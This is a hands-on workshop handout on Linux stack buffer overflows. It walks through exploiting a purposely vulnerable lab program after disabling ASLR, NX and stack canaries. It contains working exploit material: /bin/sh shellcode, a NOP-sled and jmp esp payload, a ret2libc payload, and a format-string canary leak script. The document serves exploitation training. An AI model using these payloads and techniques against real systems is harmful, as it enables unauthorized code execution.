# Buffer Overflows 2018
## Parker Garrison

```
To get started
	You will need the files: segment_mem.c, wisdom.c, runescape.sh, pat_gen.py, pat_ind.py
		git clone https://github.com/parkergarrison/overflow

	You will need gdb-peda to execute some of the gdb commands such as checksec:
		git clone https://github.com/longld/peda.git ~/peda
		echo "source ~/peda/peda.py" >> ~/.gdbinit

Memory and the Stack
	Ensure ASLR is off
		echo 0 > /proc/sys/kernel/randomize_va_space
	
	Compile segment_mem.c
		gcc segment_mem.c -o segment_mem
	
	Run this binary to examine addresses which are in various memory segments:
		./segment_mem example output:
			Address in .text: 04244c8d

			Address of etext: 08048688
			Address in .data: 08048690
			Address in .data: 0804996c

			Address of edata: 08049970
			Address in .bss: 08049978

			Address of end: 0804997c
			Address in heap: 09a93008

			...

			Address in stack: bfd2f98e
			Address in stack: bfd2f98e
			Address in stack: bfd2f988
		
Exploit Mitigations and Bypasses
	Exercise 0: No Mitigations
		Compile wisdom-basic.c without NX
			gcc wisdom-basic.c -g -fno-stack-protector -z execstack -o wisdom_e0.out 
		
		Generate a cyclic pattern of length 300
			chmod +x ./pat_gen.py
			./pat_gen.py 300
		
		Compute the offset of the start of the pattern to saved value of EIP
			chmod +x ./pat_ind.py
			python ./pat_ind.py [hexdigits]
		
		Display functions in the program
			(gdb) info functions
		
		Print the address of shell function
			(gdb) print shell
		
		Print escaped attack code to call shell function
			python -c 'print "A"*152 + r"\xfc\x85\x04\x08"'

		Execute program while escaping input
			chmod +x runescape.sh
			./runescape.sh ./wisdom_e0.out
		
		Ensure that pgrep will find the correct process
			ps -ef | grep wisdom
			
		Attach to gdb
			gdb -p $(pgrep wisdom)
		
		Detach from gdb
			(gdb) detach
	
	Exercise 1: No mitigations, no shell function
		There are a few differences from above.
		
		Compile wisdom.c without NX
			gcc wisdom.c -g -fno-stack-protector -z execstack -o wisdom.out
		
		Generate a pattern to use as input and compute the offset to saved EIP
			./pat_gen.py 300
			python ./pat_ind.py [hexdigits]
		
		Find the location of esp
			gdb-peda$ info registers esp
			(shortcut: i r esp)
			
			python -c 'print "A"*152 + r"\xfc\x85\x04\x08"'
		
			
	Bypass ASLR, no NX with Trampoline
		Find useful ESP gadgets
			gdb-peda> jmpcall
		
		/bin/sh Shellcode from exploit-db in escaped format
			\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
			
		Print escaped ASLR bypass exploit code
			Python file: 
				sc = r"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
				nops = r"\x90" * 16
				addr =  r"\x8f\x8b\x04\x08" # This address contains a jmp esp
				
				print "A"*152 + addr + nops + sc
				
	
	Bypass NX with ret2libc
		Manually find address of "/bin/bash" string
			gdb> print wisdoms[1]
				$1 = 0x8048a08 "A great shell to use is /bin/bash"
			gdb> print wisdoms[1]+24
				$2 = 0x8048a20 "/bin/bash"
			
		Examine memory location as a string
			gdb-peda$ x/s 0x8048a20
				0x8048a20:	 "/bin/bash"
			
		
		Find addresses of functions
			gdb-peda$ p system
				$1 = {<text variable, no debug info>} 0xb7e503e0 <system>
			gdb-peda$ p exit
				$2 = {<text variable, no debug info>} 0xb7e431b0 <exit>
				
		Recompile wisdom.c with NX and no stack canaries
			gcc wisdom.c -g -o wisdom.out-nx -fno-stack-protector
			chmod +x runescape.sh
			./runescape.sh wisdom.out-nx
		
		Print escaped NX bypass exploit code
			Python file:
				addr_system_esc = r"\xe0\x03\xe5\xb7"
				addr_exit_esc = r"\xb0\x31\xe4\xb7"
				args = r"\x20\x8a\x04\x08"
				
				print "A"*152 + addr_system_esc + addr_exit_esc + args
		
		Recompile wisdom.c with Stack Canaries
			gcc wisdom.c -g -o wisdom-canary -fstack-protector -z execstack
		
		Print program input which will leak a canary when interpreted as a format string
			python -c 'print "%x " * 40'
		
		Print escaped Stack Canary exploit code
			Python file:
				#!/usr/bin/python
				import sys
				
				# Exploit Linux randomized null terminator canaries with 2 buffers
				
				def lp(s, n):
					return "0"*(n-len(s))+s

				def reverse_and_escape(hexstring):
					return "".join([r"\x"+hexstring[2*i:2*i+2] for i in range(int(len(hexstring)/2))][::-1])


				''' Exploit parameters '''
				canary_hex_little = sys.argv[1]
				eip_offset_1 = 34*4
				eip_offset_2 = 34*4
				eip_hex_str = "804876c"


				eip_escaped = reverse_and_escape(eip_hex_str.zfill(8))
				canary_offset_1 = eip_offset_1 - 8
				print "A"*canary_offset_1+"B"+reverse_and_escape(canary_hex_little)[1*4:]+"CCCC"*3+eip_escaped # skip the first null byte

				canary_offset_2 = eip_offset_2 - 8
				print "A"*canary_offset_2 # implicit "\x00" will be written
		
		Run the file:
			python exploit_e4_canaryleak.py [canaryhex]
```

